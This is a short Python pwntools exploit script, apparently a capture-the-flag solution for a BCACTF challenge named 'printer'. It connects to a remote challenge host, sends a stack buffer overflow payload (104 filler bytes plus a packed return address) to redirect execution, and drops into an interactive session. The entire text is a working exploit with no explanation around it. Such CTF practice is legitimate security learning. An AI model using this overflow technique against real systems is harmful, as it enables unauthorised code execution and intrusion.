from pwn import *
p=process('./printer')
p=remote('challs.bcactf.com', 45619)
payload=b'a'*104+p32(0x80490bd)
#input()
p.send(payload)
p.interactive()
